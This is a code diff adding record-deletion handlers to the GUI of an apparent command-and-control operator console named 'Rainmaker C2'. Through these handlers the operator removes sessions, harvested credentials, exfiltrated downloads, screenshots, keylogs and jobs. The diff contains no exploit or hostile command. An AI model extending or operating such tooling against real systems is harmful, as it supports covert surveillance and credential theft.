@@ -2070,6 +2070,133 @@ namespace CsdevGui
             CopyToClipboard(row.ToInfoText(), "会话信息");
         }
 
+        /// <summary>从列表删除会话记录 (仅清理服务端状态, 不下发命令; 用于清理已离线/失效会话)。</summary>
+        private async void CtxRemove_Click(object sender, RoutedEventArgs e)
+        {
+            var row = TargetSession();
+            if (row == null) { SetStatus("请先选择一行会话"); return; }
+
+            var ans = MessageBox.Show(this,
+                "从列表删除会话 " + row.Sid + " (" + row.User + "@" + row.Host + ") ?\n\n" +
+                "仅移除服务端会话记录, 不会向目标下发任何命令。若目标是活的, 建议先用「结束会话」。",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+
+            try
+            {
+                using (var doc = await _api.RemoveSessionAsync(row.Sid))
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok"))
+                    {
+                        SetStatus("已从列表删除会话: " + row.Sid);
+                        await PollAsync();
+                    }
+                    else
+                    {
+                        SetStatus("删除会话失败: " + root.Str("error", "服务端未返回原因"));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                SetStatus("删除会话失败 (网络): " + ex.Message);
+            }
+        }
+
+        // ------------------------------------------------------------ 记录删除
+
+        private async void DeleteCred_Click(object sender, RoutedEventArgs e)
+        {
+            var row = GridCreds.SelectedItem as CredRow;
+            if (row == null || row.Id <= 0) { SetStatus("请先选中一条凭据 (且该条有 id)"); return; }
+            var ans = MessageBox.Show(this, "删除凭据 #" + row.Id + "  " + row.User + " ?",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+            try
+            {
+                using (var doc = await _api.DeleteCredentialAsync(row.Id))
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok")) { SetStatus("已删除凭据 #" + row.Id); await PollAsync(); }
+                    else SetStatus("删除凭据失败: " + root.Str("error", "服务端未返回原因"));
+                }
+            }
+            catch (Exception ex) { SetStatus("删除凭据失败 (网络): " + ex.Message); }
+        }
+
+        private async void DeleteDownload_Click(object sender, RoutedEventArgs e)
+        {
+            var row = GridDownloads.SelectedItem as DownloadRow;
+            if (row == null || row.Id <= 0) { SetStatus("请先选中一条下载记录 (且该条有 id)"); return; }
+            var ans = MessageBox.Show(this, "删除下载 #" + row.Id + "  " + row.Name + " ?\n\n同时删除服务端落盘文件。",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+            try
+            {
+                using (var doc = await _api.DeleteDownloadAsync(row.Id))
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok")) { SetStatus("已删除下载 #" + row.Id); await PollAsync(); }
+                    else SetStatus("删除下载失败: " + root.Str("error", "服务端未返回原因"));
+                }
+            }
+            catch (Exception ex) { SetStatus("删除下载失败 (网络): " + ex.Message); }
+        }
+
+        private async void DeleteShot_Click(object sender, RoutedEventArgs e)
+        {
+            var row = ListShots.SelectedItem as ShotRow;
+            if (row == null || row.Id <= 0) { SetStatus("请先选中一张截屏 (且该条有 id)"); return; }
+            var ans = MessageBox.Show(this, "删除截屏 #" + row.Id + " ?\n\n同时删除服务端落盘文件。",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+            try
+            {
+                using (var doc = await _api.DeleteScreenshotAsync(row.Id))
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok")) { SetStatus("已删除截屏 #" + row.Id); await PollAsync(); }
+                    else SetStatus("删除截屏失败: " + root.Str("error", "服务端未返回原因"));
+                }
+            }
+            catch (Exception ex) { SetStatus("删除截屏失败 (网络): " + ex.Message); }
+        }
+
+        private async void ClearKeylogs_Click(object sender, RoutedEventArgs e)
+        {
+            var ans = MessageBox.Show(this, "清空全部键盘记录 ?",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+            try
+            {
+                using (var doc = await _api.ClearKeylogsAsync())
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok")) { SetStatus("已清空键盘记录"); await PollAsync(); }
+                    else SetStatus("清空失败: " + root.Str("error", "服务端未返回原因"));
+                }
+            }
+            catch (Exception ex) { SetStatus("清空失败 (网络): " + ex.Message); }
+        }
+
+        private async void JobCtxClear_Click(object sender, RoutedEventArgs e)
+        {
+            var ans = MessageBox.Show(this, "清空所有已结束的作业 (保留 running) ?",
+                "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
+            if (ans != MessageBoxResult.OK) return;
+            try
+            {
+                using (var doc = await _api.ClearJobsAsync())
+                {
+                    var root = doc.RootElement;
+                    if (root.Bool("ok")) { SetStatus("已清空已结束作业"); await PollAsync(); }
+                    else SetStatus("清空作业失败: " + root.Str("error", "服务端未返回原因"));
+                }
+            }
+            catch (Exception ex) { SetStatus("清空作业失败 (网络): " + ex.Message); }
+        }
+
         // ------------------------------------------------------------ 连接 / 连接配置
 
         /// <summary>顶栏地址的当前取值 (可编辑 ComboBox: 文本就是用户输入); 空则回默认地址。</summary>
